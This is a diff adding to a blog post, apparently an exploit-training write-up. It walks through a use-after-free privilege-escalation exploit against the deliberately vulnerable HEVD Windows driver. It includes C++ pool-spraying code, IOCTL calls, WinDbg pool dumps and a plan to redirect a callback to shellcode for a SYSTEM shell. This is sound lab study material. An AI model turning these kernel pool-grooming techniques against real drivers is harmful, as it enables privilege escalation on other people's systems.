@@ -153,4 +153,300 @@ Looking up the memory address of what was our freed chunk we see that it is NOT 
 
 ![](/assets/images/AWE/10uaf.PNG)
 
-This is not what we want. We want this to be **predictable** just like our last exploit. We want the freed address of our UAF object to be filled with 
+This is not what we want. We want this to be **predictable** just like our last exploit. We want the freed address of our UAF object to be filled with our fake object, so when the function pointer at that address is called, it will be a pointer we control, our shellcode. To do this, our plan of attack is very similar to our last post. **Please go through that exploit first!**
+
+## Spraying the Non-Paged Pool
+First thing is first, we need an object that fits our needs. Last post we used Event Objects, but this time around, since we need `0x60` sized chunks, we'll be using `IoCompletionReserve` objects which we can allocate with `NtAllocateReserveObject` (thanks blogpost authors). 
+
+We'll do the same thing we did last time but spray some more. In my testing I found that I had to spray more to get the chunks sequential like we want:
++ defragment the pool with 10,000 objects
++ aim for some sequential/contiguous blocks of objects with another spray of 30,000 objects.
+
+Next, we'll want to poke holes in the contiguous block portion, remember? We'll be collecting handles to these objects in vectors so that we can later free the ones we need to create the holes. The holes are already the perfect size, so we'll just free every other contiguous block handle so that way, every hole that is created in our contiguous block will be surrounded on both sides by our objects. Let's update our exploit code and test out the spray. Huge thanks to @tekwizz123 once again for showing in his exploit how to get `NtAllocateReserveObject` into the program, would've taken me a long time to trouble shoot those compilation errors without his help. Our spray test code:
+```cpp
+#include <iostream>
+#include <vector>
+#include <Windows.h>
+
+using namespace std;
+
+#define DEVICE_NAME             "\\\\.\\HackSysExtremeVulnerableDriver"
+#define ALLOCATE_UAF_IOCTL      0x222013
+#define FREE_UAF_IOCTL          0x22201B
+#define FAKE_OBJECT_IOCTL       0x22201F
+#define USE_UAF_IOCTL           0x222017
+
+vector<HANDLE> defrag_handles;
+vector<HANDLE> sequential_handles;
+
+typedef struct _LSA_UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR Buffer;
+} UNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    UNICODE_STRING* ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES;
+
+#define POBJECT_ATTRIBUTES OBJECT_ATTRIBUTES*
+
+typedef NTSTATUS(WINAPI* _NtAllocateReserveObject)(
+    OUT PHANDLE hObject,
+    IN POBJECT_ATTRIBUTES ObjectAttributes,
+    IN DWORD ObjectType);
+
+HANDLE grab_handle() {
+
+    HANDLE hFile = CreateFileA(DEVICE_NAME,
+        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        cout << "[!] No handle to HackSysExtremeVulnerableDriver\n";
+        exit(1);
+    }
+
+    cout << "[>] Grabbed handle to HackSysExtremeVulnerableDriver: " << hex
+        << hFile << "\n";
+
+    return hFile;
+}
+
+void create_UAF_object(HANDLE hFile) {
+
+    cout << "[>] Creating UAF object...\n";
+    BYTE input_buffer[] = "\x00";
+
+    DWORD bytes_ret = 0x0;
+
+    int result = DeviceIoControl(hFile,
+        ALLOCATE_UAF_IOCTL,
+        input_buffer,
+        sizeof(input_buffer),
+        NULL,
+        0,
+        &bytes_ret,
+        NULL);
+
+    if (!result) {
+
+        cout << "[!] Could not create UAF object\n";
+        cout << "[!] Last error: " << dec << GetLastError() << "\n";
+        exit(1);
+    }
+    cout << "[>] UAF object allocated.\n";
+}
+
+void free_UAF_object(HANDLE hFile) {
+
+    cout << "[>] Freeing UAF object...\n";
+    BYTE input_buffer[] = "\x00";
+
+    DWORD bytes_ret = 0x0;
+
+    int result = DeviceIoControl(hFile,
+        FREE_UAF_IOCTL,
+        input_buffer,
+        sizeof(input_buffer),
+        NULL,
+        0,
+        &bytes_ret,
+        NULL);
+
+    if (!result) {
+
+        cout << "[!] Could not free UAF object\n";
+        cout << "[!] Last error: " << dec << GetLastError() << "\n";
+        exit(1);
+    }
+    cout << "[>] UAF object freed.\n";
+}
+
+void allocate_fake_object(HANDLE hFile) {
+
+    cout << "[>] Creating fake UAF object...\n";
+    BYTE input_buffer[0x58] = { 0 };
+
+    memset((void*)input_buffer, '\x41', 0x58);
+
+    DWORD bytes_ret = 0x0;
+
+    int result = DeviceIoControl(hFile,
+        FAKE_OBJECT_IOCTL,
+        input_buffer,
+        sizeof(input_buffer),
+        NULL,
+        0,
+        &bytes_ret,
+        NULL);
+
+    if (!result) {
+
+        cout << "[!] Could not create fake UAF object\n";
+        cout << "[!] Last error: " << dec << GetLastError() << "\n";
+        exit(1);
+    }
+    cout << "[>] Fake UAF object created.\n";
+}
+
+void spray() {
+
+    // thanks Tekwizz as usual
+    _NtAllocateReserveObject NtAllocateReserveObject = 
+        (_NtAllocateReserveObject)GetProcAddress(GetModuleHandleA("ntdll.dll"),
+            "NtAllocateReserveObject");
+
+    if (!NtAllocateReserveObject) {
+
+        cout << "[!] Failed to get the address of NtAllocateReserve.\n";
+        cout << "[!] Last error " << GetLastError() << "\n";
+        exit(1);
+    }
+
+    cout << "[>] Spraying pool to defragment...\n";
+    for (int i = 0; i < 10000; i++) {
+
+        HANDLE hObject = 0x0;
+
+        PHANDLE result = (PHANDLE)NtAllocateReserveObject((PHANDLE)&hObject,
+            NULL,
+            1); // specifies the correct object
+
+        if (result != 0) {
+            cout << "[!] Error allocating IoCo Object during defragmentation\n";
+            exit(1);
+        }
+        defrag_handles.push_back(hObject);
+    }
+    cout << "[>] Defragmentation spray complete.\n";
+    cout << "[>] Spraying sequential allocations...\n";
+    for (int i = 0; i < 30000; i++) {
+
+        HANDLE hObject = 0x0;
+
+        PHANDLE result = (PHANDLE)NtAllocateReserveObject((PHANDLE)&hObject,
+            NULL,
+            1); // specifies the correct object
+
+        if (result != 0) {
+            cout << "[!] Error allocating IoCo Object during defragmentation\n";
+            exit(1);
+        }
+        sequential_handles.push_back(hObject);
+    }
+
+    cout << "[>] Sequential spray complete.\n";
+
+    cout << "[>] Poking 0x60 byte-sized holes in our sequential allocation...\n";
+    for (int i = 0; i < sequential_handles.size(); i++) {
+        if (i % 2 == 0) {
+            BOOL freed = CloseHandle(sequential_handles[i]);
+        }
+    }
+    cout << "[>] Holes poked lol.\n";
+    cout << "[>] Some handles: " << hex << sequential_handles[29997] << "\n";
+    cout << "[>] Some handles: " << hex << sequential_handles[29998] << "\n";
+    cout << "[>] Some handles: " << hex << sequential_handles[29999] << "\n";
+
+    Sleep(1000);
+    DebugBreak();
+}
+
+int main() {
+
+    HANDLE hFile = grab_handle();
+
+    //create_UAF_object(hFile);
+
+    //free_UAF_object(hFile);
+
+    //allocate_fake_object(hFile);
+
+    spray();
+
+    return 0;
+}
+
+```
+
+We can see after running this and looking at one of the handles we dumped to the terminal (thanks FuzzySec!), we were able to get our pool looking the way we want. `0x60` byte chunks free surrounded by our IoCo objects. 
+```
+kd> !handle 0x2724c
+
+PROCESS 86974250  SessionId: 1  Cid: 1238    Peb: 7ffdf000  ParentCid: 1554
+    DirBase: bf5d4fc0  ObjectTable: abb08b80  HandleCount: 25007.
+    Image: HEVDUAF.exe
+
+Handle table at 89f1f000 with 25007 entries in use
+
+2724c: Object: 8543b6d0  GrantedAccess: 000f0003 Entry: 88415498
+Object: 8543b6d0  Type: (84ff1a88) IoCompletionReserve
+    ObjectHeader: 8543b6b8 (new version)
+        HandleCount: 1  PointerCount: 1
+
+
+kd> !pool 8543b6d0 
+Pool page 8543b6d0 region is Nonpaged pool
+ 8543b000 size:   60 previous size:    0  (Allocated)  IoCo (Protected)
+ 8543b060 size:   38 previous size:   60  (Free)       `.C.
+ 8543b098 size:   20 previous size:   38  (Allocated)  ReTa
+ 8543b0b8 size:   28 previous size:   20  (Allocated)  FSro
+ 8543b0e0 size:  500 previous size:   28  (Free)       Io  
+ 8543b5e0 size:   60 previous size:  500  (Allocated)  IoCo (Protected)
+ 8543b640 size:   60 previous size:   60  (Free)       IoCo
+*8543b6a0 size:   60 previous size:   60  (Allocated) *IoCo (Protected)
+		Owning component : Unknown (update pooltag.txt)
+ 8543b700 size:   60 previous size:   60  (Free)       IoCo
+ 8543b760 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
+ 8543b7c0 size:   60 previous size:   60  (Free)       IoCo
+ 8543b820 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
+ 8543b880 size:   60 previous size:   60  (Free)       IoCo
+ 8543b8e0 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
+ 8543b940 size:   60 previous size:   60  (Free)       IoCo
+ 8543b9a0 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
+ 8543ba00 size:   60 previous size:   60  (Free)       IoCo
+ 8543ba60 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
+ 8543bac0 size:   60 previous size:   60  (Free)       IoCo
+ 8543bb20 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
+ 8543bb80 size:   60 previous size:   60  (Free)       IoCo
+ 8543bbe0 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
+ 8543bc40 size:   60 previous size:   60  (Free)       IoCo
+ 8543bca0 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
+ 8543bd00 size:   60 previous size:   60  (Free)       IoCo
+ 8543bd60 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
+ 8543bdc0 size:   60 previous size:   60  (Free)       IoCo
+ 8543be20 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
+ 8543be80 size:   60 previous size:   60  (Free)       IoCo
+ 8543bee0 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
+ 8543bf40 size:   60 previous size:   60  (Free)       IoCo
+ 8543bfa0 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
+```
+
+## Executing Plan
+Now that we've confirmed our heap spray works, the next step is to implement our game-plan. We want to:
++ spray the heap to get it like so ^^,
++ allocate our UAF object,
++ free our UAF object,
++ create our fake objects with malicious callback function pointers,
++ activate the callback function.
+
+All we really need to do now is allocate the shellcode, get a pointer to it, and place that pointer into our input buffer when we create our fake objects and spray those into the holes we poked so around 15,000 of them. 
+
+When we run our final code, we get our system shell!
+
+![](/assets/images/AWE/11uaf.PNG)
+
+Complete exploit [code]()
+
+## Conclusion
+That was a pretty exaggerated exploit scenario I would guess but it was perfect for me since I had never done a UAF exploit before. Next we'll be doing the stack overflow again but this time on Windows 10 where we'll have to bypass SMEP. Until next time.
